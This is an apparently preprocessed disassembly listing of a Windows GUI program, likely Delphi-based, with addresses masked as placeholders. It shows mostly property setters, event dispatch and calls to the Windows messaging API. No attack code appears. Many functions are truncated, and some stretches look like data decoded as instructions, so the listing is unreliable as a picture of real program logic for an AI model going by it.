mov eax edx
xchg ecx eax
mov edx ebx
call sub_4440b4
pop ebx
retn
sub_447bcc
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_447be0
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_447d15
jmp sub_403580
sub_447e17
jmp sub_403834
sub_447e42
jmp sub_403834
sub_447e49
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_447e60
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_448048
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_447998
sub_4480c8
jmp sub_403834
sub_44810c
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_448124
push ebx
mov ebx eax
mov eax ebx
call sub_41a12c
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_448176
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_447998
sub_4481ec
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_448335
jmp sub_403834
sub_44833c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44857c
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_44858c
sub_4485e0
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_4485f0
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_448600
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_448610
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_448620
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_448698
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_4449e0
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_4449e0
retn
sub_4486b4
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_4449e0
sub_4486fc
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_447950
retn
mov eax edx
retn
sub_448736
jmp sub_403580
sub_44873b
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4544c0
call sub_4038e8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448aa1
jmp sub_403834
sub_448aa8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4030f8
retn
sub_448abe
jmp sub_403834
sub_448bbf
jmp sub_403834
sub_448bc6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448be3
mov eax [ ebp - 0x14 ]
call sub_4030f8
retn
sub_448bdc
jmp sub_403834
sub_448c01
jmp sub_403834
sub_448c8b
jmp sub_403834
sub_448c92
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448cc4
push ebx
mov ebx eax
mov eax ebx
call sub_413b90
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41aedc
sub_448d88
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_448d9c
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_448da4
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_449169
jmp sub_403834
sub_449170
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_449270
jmp sub_403834
sub_449277
pop ebp
retn
sub_449726
inc esp
add [ eax ] bl
test [ ebx ] al
or al 0xc4
inc esp
add al cl
xchg [ ebx ] eax
int3
sub_449776
push esp
0x44
sub_449d52
inc esp
add al cl
xchg [ ebx ] eax
int3
sub_44a056
inc esp
add al cl
xchg [ ebx ] eax
int3
sub_44adf6
inc esp
add al cl
xchg [ ebx ] eax
int3
sub_44b274
mov eax [ rw-data ]
retn
sub_44b27c
mov [ rw-data ] eax
retn
j_sub_403580#9
jmp sub_403580
sub_44b3fb
jmp sub_403834
sub_44b402
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b70a
jmp sub_403834
sub_44b711
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44b7b5
jmp sub_403834
sub_44b7bc
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b84c
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_44bf78
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44c624
sub_44bf94
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_44bf78
sub_44c0b4
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44c624
sub_44c0cc
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44c624
sub_44c0e4
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_44c624
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_44c110
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_44c11c
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_44c624
retn
sub_44c3fc
push ebx
mov ebx edx
mov edx ebx
call sub_43811c
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_44c46c
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_44c594
jmp sub_403834
sub_44c59b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c5a4
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_44b9b0
mov eax [ ebx + 0x20c ]
call sub_44b9b0
sub_44c604
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_44c614
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_44c70f
jmp sub_403834
sub_44c71c
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_44c734
sub_44c950
retn
sub_44c9be
jmp sub_403834
sub_44c9fd
jmp sub_403834
sub_44ca30
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_439614
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_44bc3c
retn
sub_44ca54
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_439634
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_44bc3c
retn
sub_44cb49
jmp sub_403834
sub_44cb50
mov eax [ ebp - 0x4 ]
call sub_43b594
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44b8a4
mov eax [ ebp - 0x4 ]
call sub_44c624
sub_44cc84
jmp sub_403834
sub_44ccbc
jmp sub_403834
sub_44ccc3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cce3
lea eax [ ebp - 0x114 ]
call sub_403eb4
retn
sub_44ccdc
jmp sub_403834
sub_44cce3
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_44cfea
jmp sub_403834
sub_44cff1
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403454
sub_44d045
jmp sub_403580
j_sub_403580#8
jmp sub_403580
sub_44d0c6
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4544c0
call sub_4038e8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d47e
jmp sub_403834
sub_44d485
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d560
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417bb4
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_44d578
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d5b0
mov edx eax
mov eax esi
call sub_41943c
pop esi
pop ebx
retn
sub_44d594
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44e954
mov edx eax
mov eax esi
call sub_41943c
pop esi
pop ebx
retn
sub_44d5b0
push ebx
mov ebx eax
mov eax ebx
call sub_44e5f4
mov edx r-xdata
call sub_41da38
pop ebx
retn
sub_44d6b4
push ebx
mov ebx eax
mov eax ebx
call sub_44d6c4
xor al 0x1
pop ebx
retn
sub_44d6c4
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_44d720
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_44d740
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_44d760
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_44da59
jmp sub_403834
sub_44da60
pop ecx
pop ebp
retn
sub_44da64
xor eax eax
retn
sub_44dd3c
jmp sub_403834
sub_44dd43
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4030f8
retn
sub_44dd59
jmp sub_403834
sub_44de43
jmp sub_403834
sub_44de4a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44de67
mov eax [ ebp - 0xc ]
call sub_4030f8
retn
sub_44de60
jmp sub_403834
sub_44de87
jmp sub_403834
sub_44e172
jmp sub_403834
sub_44e305
jmp sub_403834
sub_44e5f4
mov eax [ eax + 0x238 ]
retn
sub_44e5fc
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_44e608
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_44e946
jmp sub_403834
sub_44e94d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e954
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_44e99c
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_438830
sub_44e9b8
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_44e9f4
push ebx
mov ebx eax
mov eax ebx
call sub_43a7c4
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41d4f4
sub_44ea78
push ebx
mov ebx eax
mov eax ebx
call sub_43a7ec
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_41dadc
sub_44ea98
push ebx
mov ebx eax
mov eax ebx
call sub_44e6b8
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_44e780
pop ebx
retn
sub_44f2c5
lea eax [ ebp - 0xb4 ]
call sub_403eb4
retn
sub_44f2d1
jmp sub_403834
j_sub_44f2c5
jmp sub_44f2c5
sub_44f2d8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f430
jmp sub_403834
sub_44f437
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f71c
jmp sub_403834
sub_44f723
mov eax [ rw-data ]
call sub_451fd4
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f73a
add [ eax ] al
retn
sub_44f998
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_44f9b8
mov eax [ eax + 0x240 ]
call sub_421c80
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_453d74
sub_44fa5f
jmp sub_403834
sub_44fa66
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fa89
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41dab4
retn
sub_44fa82
jmp sub_403834
sub_44fa89
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44fc48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f9b8
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_44feb0
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_447b04
sub_44ff9b
jmp sub_403834
sub_44ffa2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ffa8
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_44f790
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_450000
call sub_450d28
retn
sub_45044d
jmp sub_403834
sub_450454
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403580#7
jmp sub_403580
sub_450aec
jmp sub_403580
sub_450be5
jmp sub_403834
sub_450bec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450c09
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
sub_450c02
jmp sub_403834
sub_450c09
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_450c10
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_421c80
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44d658
sub_450c30
call sub_4030f8
retn
sub_450c88
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_450cee
jmp sub_403834
j_sub_403580#6
jmp sub_403580
sub_450ec8
xor edx edx
call sub_44d9bc
retn
sub_450ed0
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_44d9bc
mov eax ebx
call sub_434cf0
pop ebx
retn
sub_450f56
jmp sub_403834
sub_450f5d
pop ebx
pop ecx
pop ebp
retn
sub_450f64
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_43b290
push eax
call PostMessageA
pop ebx
retn
sub_451168
jmp sub_403834
sub_451209
jmp sub_403834
sub_451213
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451232
mov eax [ rw-data ]
call sub_45344c
retn
sub_45122b
jmp sub_403834
sub_451232
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45124f
lea eax [ ebp - 0x20 ]
call sub_403eb4
retn
sub_451248
jmp sub_403834
sub_45124f
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451330
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_433e9c
retn
mov edx eax
mov eax [ rw-data ]
call sub_452aa0
retn
sub_4516b4
mov edx eax
mov eax [ rw-data ]
call sub_4544c0
mov al 0x1
retn
sub_45179c
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_4516c4
sub_4517b0
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_4516c4
sub_4517c4
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_4516c4
sub_4517d8
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_4516c4
sub_4517ec
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_451957
jmp sub_403834
sub_45195e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451964
push ebx
mov ebx eax
mov eax ebx
call sub_439ba8
mov eax ebx
call sub_439d2c
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_450f64
sub_451bda
jmp sub_403834
sub_451be1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_451be8
push ebx
mov ebx edx
mov edx ebx
call sub_43a010
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_433fa4
pop ebx
retn
sub_451c3c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_451ca4
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_451c54
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_451ca4
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_451c70
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_451ca4
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_451c88
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_451ca4
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_451f24
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_451f30
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_451f3c
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_451f48
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_451f54
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_451f60
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_451f6c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_4139f4
pop esi
pop ebx
retn
sub_451f80
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_451f9c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4139f4
pop esi
pop ebx
retn
sub_451fb0
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_451fb8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4139f4
pop esi
pop ebx
retn
sub_451fcc
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_4520a8
mov eax [ eax + 0x54 ]
call sub_413898
retn
sub_4520b4
mov eax [ eax + 0x54 ]
call sub_413b90
retn
sub_452307
jmp sub_403834
sub_45234b
jmp sub_403834
sub_452352
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4523a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4521a0
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403f08
pop esi
pop ebx
retn
sub_45240c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_4139f4
pop esi
pop ebx
retn
sub_452420
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_452625
jmp sub_403834
sub_45262c
pop ebx
mov esp ebp
pop ebp
retn
sub_452634
inc [ eax + 0x8c ]
retn
sub_45263c
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_45265c
sub_45265c
xor edx edx
call sub_452aa0
retn
sub_452a92
jmp sub_403834
sub_452b19
jmp sub_403834
sub_452b28
add eax 0x30
call sub_40cc80
retn
sub_452b6c
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_452bbd
jmp sub_403580
sub_452bc2
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_4544c0
call sub_4038e8
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_453291
jmp sub_403834
sub_453298
pop ebx
mov esp ebp
pop ebp
retn
sub_453420
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_45344c
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_453478
xor edx edx
call sub_453370
retn
sub_453480
mov dl 0x1
call sub_453370
retn
sub_4534f4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45350c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_4535d9
jmp sub_403834
sub_4535e0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453d2a
jmp sub_403580
sub_454328
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_45437e
jmp sub_403580
j_sub_403580#5
jmp sub_403580
sub_45449e
jmp sub_403834
sub_4544a5
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4544ac
call sub_40c7d0
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_4546a5
jmp sub_403834
sub_4546ac
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_454773
jmp sub_403834
sub_45477a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454950
jmp sub_403834
sub_454957
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4549b8
jmp sub_403834
sub_4549bf
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4549c8
call sub_454790
retn
sub_454bb3
jmp sub_403580
sub_454c0c
jmp sub_403834
sub_454c13
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454d41
jmp sub_403834
sub_454ea0
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_45519f
jmp sub_403834
sub_4551ce
jmp sub_403834
sub_4552da
jmp sub_403834
sub_4552e1
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_455672
jmp sub_403834
sub_455679
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45579c
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_4557e7
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_4557f8
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_455808
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_45587b
jmp sub_403834
sub_455882
pop ebp
retn
sub_455884
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_455818
call sub_403c04
call sub_45579c
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_44b550
call sub_4134e8
sub_455d5c
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_455d70
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_455d84
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_455d98
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_455e66
jmp sub_403834
sub_455e74
push ebx
cmp [ eax + 0x62 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_455e88
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_455e9c
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_455eb0
push ebx
cmp [ eax + 0x82 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
sub_455ecc
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_455f3c
push ebx
cmp [ eax + 0xa2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_455f58
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_455f94
inc [ eax + 0x3c ]
retn
sub_4562b8
jmp sub_403834
sub_4562bf
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456334
jmp sub_403834
sub_45633b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4563ab
jmp sub_403834
sub_4563b2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45641f
jmp sub_403834
sub_456426
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4564db
jmp sub_403834
sub_4564e2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456571
jmp sub_403834
sub_456578
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4565eb
jmp sub_403834
sub_4565f2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456664
jmp sub_403834
sub_45666b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4566e0
jmp sub_403834
sub_4566e7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456757
jmp sub_403834
sub_45675e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4567cb
jmp sub_403834
sub_4567d2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456844
